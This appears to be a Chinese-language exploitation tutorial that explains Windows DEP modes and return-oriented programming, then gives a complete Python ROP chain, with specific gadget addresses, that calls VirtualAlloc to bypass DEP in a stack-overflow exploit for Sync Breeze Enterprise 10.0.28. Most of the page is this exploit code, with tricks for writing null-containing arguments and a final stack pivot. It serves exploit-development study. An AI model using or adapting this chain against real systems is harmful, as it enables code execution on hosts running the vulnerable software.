---
layout: default
---

 >- 使用 Sync Breeze Enterprise 10.0.28 用于测试对象. 
 >- 由于 Sync Breeze Enterprise 10.0.28 未导入VirtualAlloc, 使用GetLastError地址替换.
 
 ## DEP 简介
#### DEP 总共有4种模式.
>- OptIn:           	DEP 只对系统进程和指定进程开启.
> - OptOut:        	DEP 对所有进程开启,除非指定了特定进程不开启.
> - AlwaysOn :   	DEP 始终开启.
>-  AlwasysOff : 	DEP 始终关闭.
>-  win7 和 win10 默认使用 OptIn. 	windows Server 2012 或  Windows Server 2019 默认使用AlwaysOn.
#### 为了兼容性问题, 有些情况下可以对进程开启或关闭 DEP
>- LdrpCheckNXCompatibility 	用于检查以确定是否应为进程启动DEP支持. (ntdll.dll)
>-  NtSetInformationProcess 		用于是开启或禁用正在运行的进程的DEP. (ntdll.dll)

#### win10 强制开启指定进程DEP
>安全中心 -> 打开Windows安全中心 -> 应用和浏览器控制 -> Exploit Protection -> 程序设置 -> 添加程序自定义 -> 数据执行保护(DEP)
>- 编译过程中加入 /NXCOMPAT标志 , 在进程运行期间无法禁用DEP. 
> - 这意味着在整个过程中无法关闭 DEP, 那么唯一的选择就是规避系统的NX检查.
---
##  Return  Oriented Programming (ROP)
> ROP 原理是用程序中己有的代码片段来组成可执行的代码链.
> 通过将不同代码片段地址注入到栈中, 使用RET来控制程序流程.
> 最终调用 VirtualAlloc,VirtualProtect 等函数改写内存权限执行Shellcode.
```
> 假设栈内数据如下的情况下,代码会依次执行. 使用栈来控制RET的跳转.

  ESP 0 -> 0x1013fc06  	# xor eax, eax ; ret ;
  ESP 4 -> 0x101229f2	# inc eax ; ret ;
  ESP 8 -> 0x10114901	# mov  [ecx], eax ; ret ;
```
#### 使用rp++获取Gadgets
```
- https://github.com/0vercl0k/rp
- rp-win-x86.exe -f Test.exe -r 5 > rop.txt  
```

#### 使用VirtualAlloc改变虚拟地址属性
```
 LPVOID WINAPI VirtualAlloc(
   _In_opt_ LPVOID lpAddress,
   _In_     SIZE_T dwSize,
   _In_     DWORD  flAllocationType,
   _In_     DWORD  flProtect
 );
```
>- pAddress: 如果指向己分配页面,则可以使用flProtect改变页面属性.
>- dwSize: 以页为单位 Shellcode如果小于0x1000字节, dwSize在0x01~0x1000之间即可.
>- flAllocationType: 必须设置为MEM_COMMIT (0x00001000).
>- flProtect: 必须设置为PAGE_EXECUTE_READWRITE (0x00000040).

#### 调用栈信息
- 将以下栈数据放到溢出EIP之前. 
```
0d2be300 75f5ab90 -> KERNEL32!VirtualAllocStub (kernel32.dll符号表中名字为VirtualAllocStub)
0d2be304 0d2be488 -> Return address (Shellcode on the stack)
0d2be308 0d2be488 -> lpAddress (Shellcode on the stack)
0d2be30c 00000001 -> dwSize
0d2be310 00001000 -> flAllocationType
0d2be314 00000040 -> flProtect
```
#### 需要解决的问题
>- 得到栈地址 (通过PUSH ESP; POP REGISTER; 来获取)
>- 得到 VirtualAlloc 地址 (通过IAT表获得)
>- 得到 Shellcode 地址 (通过计算溢出数据来计算)
>- dwSize, flAllocation Type和 flProtect 包含0x00字符. (通过负数运算,自增,自减,取反等方式写入)

#### 参考代码
```
  #-----------调用框架----------
  va = pack('<L', 0x45454545)	# KERNEL32!VirtualAllocStub
  va += pack('<L', 0x46464646)	# Return address (Shellcode on the stack)
  va += pack('<L', 0x47474747)	# lpAddress (Shellcode on the stack)
  va += pack('<L', 0x48484848) 	# dwSize
  va += pack('<L', 0x49494949) 	# flAllocationType
  va += pack('<L', 0x51515151)	# flProtect

  #-----------得到栈地址----------
  eip = pack('<L', 0x10154112)	# push esp ; inc ecx ; adc eax, 0x08468B10 ; pop esi ; ret ; (将ESP地址赋值给ESI)
  rop = pack("<L", 0x41414141)	# offset (栈偏移对齐,根据漏洞情况而定)
  rop += pack('<L', 0x10052048)	# mov eax, esi ; pop esi ; retn 0x0004 ; (将ESP地址赋值给EAX(EAX 操作指令更多))
  rop += pack("<L", 0x41414141)	# alignment pop esi
  
  #-----------得到VA地址 (esp - 20)----------
  rop += pack("<L", 0x10154336)	# pop ebp ; ret ;
  rop += pack("<L", 0x41414141)	# alignment retn 0x0004 (先RET然后ESP+4)
  rop += pack("<L", 0xFFFFFFE0)	# -0x00000020 = 0xFFFFFFE0
  rop += pack("<L", 0x100fcd71)	# add eax, ebp ; dec ecx ; ret ;(eax = esp - 0x20 指向VA栈顶)
  rop += pack("<L", 0x100baecb)	# xchg eax, ecx ; ret ; 
  
  #-----------写入函数地址到 VA (esp - 20)----------
  rop += pack("<L", 0x1002f729)	# pop eax ; ret ; (eax = GetLastError IAT Address)
  rop += pack("<L", 0x10168040)	# GetLastError IAT Address
  rop += pack("<L", 0x1014dc4c)	# mov eax,  [eax] ; ret ; (eax = GetLastError 虚拟地址)		 
  rop += pack("<L", 0x10114901)	# mov [ecx], eax ; retn 0x000C ; (GetLastError 虚拟地址 写入VA栈顶)
  
  #-----------写入返回地址到 VA + 4 (esp - 20)----------
  rop += pack("<L", 0x10152f51)	# mov eax, ecx ; ret ;
  rop += b"A" * 0xC				# alignment retn 0x000C
  rop += pack("<L", 0x10154336)	#  pop ebp ; ret ;
  rop += pack("<L", 0xFFFFFEB8)	# -0n328 = 0xFFFFFEB8
  rop += pack("<L", 0x1014c168)	# sub eax, ebp ; pop esi ; pop ebp ; pop ebx ; ret ; (shellcode偏移,大小根据情况而定)
  rop += b"A" * 0xC				# alignment 3 pop
  rop += pack("<L", 0x10027201)	# inc ecx ; ret ;
  rop += pack("<L", 0x10027201)	# inc ecx ; ret ;
  rop += pack("<L", 0x10027201)	# inc ecx ; ret ;
  rop += pack("<L", 0x10027201)	# inc ecx ; ret ; (VA + 4 = Return address (Shellcode on the stack))
  rop += pack("<L", 0x10114901)	# mov  [ecx], eax ; retn 0x000C ;
  
  #-----------写入lpAddress到地址 VA + 8 (esp - 18)----------
  rop += pack("<L", 0x10027201)	# inc ecx ; ret ;
  rop += b"A" * 0xC				# alignment retn 0x000C
  rop += pack("<L", 0x10027201)	# inc ecx ; ret ;
  rop += pack("<L", 0x10027201)	# inc ecx ; ret ;
  rop += pack("<L", 0x10027201)	# inc ecx ; ret ; 
  rop += pack("<L", 0x10114901)	# mov  [ecx], eax ; retn 0x000C ; (VA + 4 = lpAddress address (Shellcode on the stack))
  
  #-----------写入dwSize到地址 VA + C (esp - 14)----------
  rop += pack("<L", 0x10027201)	# inc ecx ; ret ;
  rop += b"A" * 0xC				# alignment retn 0x000C
  rop += pack("<L", 0x10027201)	# inc ecx ; ret ;
  rop += pack("<L", 0x10027201)	# inc ecx ; ret ;
  rop += pack("<L", 0x10027201)	# inc ecx ; ret ; 
  rop += pack("<L", 0x1013fc06)	# xor eax, eax ; ret ;
  rop += pack("<L", 0x101229f2)	# inc eax ; ret ;
  rop += pack("<L", 0x10114901)	# mov  [ecx], eax ; retn 0x000C ; (VA + 8 = dwSize)
  
  #-----------写入flAllocationType到地址 VA + 10 (esp - 10)----------
  rop += pack("<L", 0x10027201)	# inc ecx ; ret ;
  rop += b"A" * 0xC				# alignment retn 0x000C
  rop += pack("<L", 0x10027201)	# inc ecx ; ret ;
  rop += pack("<L", 0x10027201)	# inc ecx ; ret ;
  rop += pack("<L", 0x10027201)	# inc ecx ; ret ; 
  rop += pack("<L", 0x1002f729)	# pop eax ; ret ;
  rop += pack("<L", 0xFFFFEFFF)	# -0x00001000 = 0xFFFFEFFF
  rop += pack("<L", 0x1010ccc3)	# neg eax ; ret ;
  rop += pack("<L", 0x10114901)	# mov  [ecx], eax ; retn 0x000C ; (VA + C = flAllocationType)
  
  #-----------写入flProtect到地址 VA + 14 (esp - C)----------
  rop += pack("<L", 0x10027201)	# inc ecx ; ret ;
  rop += b"A" * 0xC				# alignment retn 0x000C
  rop += pack("<L", 0x10027201)	# inc ecx ; ret ;
  rop += pack("<L", 0x10027201)	# inc ecx ; ret ;
  rop += pack("<L", 0x10027201)	# inc ecx ; ret ; 
  rop += pack("<L", 0x1002f729)	# pop eax ; ret ;
  rop += pack("<L", 0xFFFFFFC0)	# 0x00000040 = 0xFFFFFFC0
  rop += pack("<L", 0x1010ccc3)	# neg eax ; ret ;
  rop += pack("<L", 0x10114901)	# mov  [ecx], eax ; retn 0x000C ; (VA + 10 = flProtect)
  
  #-----------调用函数 KERNEL32!VirtualAllocStub----------
  rop += pack("<L", 0x10152f51)	# mov eax, ecx ; ret ;
  rop += b"A" * 0xC				# alignment retn 0x000C
  rop += pack("<L", 0x10154336)	# pop ebp ; ret ;
  rop += pack("<L", 0xFFFFFFEC)	# 0n20 = FFFFFFEC 
  rop += pack("<L", 0x100fcd71)	# add eax, ebp ; dec ecx ; ret ; (还原EAX地址到VA栈顶)
  rop += pack("<L", 0x10158c35)	# xchg eax, esp ; ret ; (将VA栈顶地址赋值给ESP)
```

> [DEP Bypass  参考](https://www.youtube.com/watch?v=phVz8CqEng8)
> [Sync Breeze Enterprise 10.0.28 栈溢出参考](https://blog.csdn.net/faint23/article/details/138291631)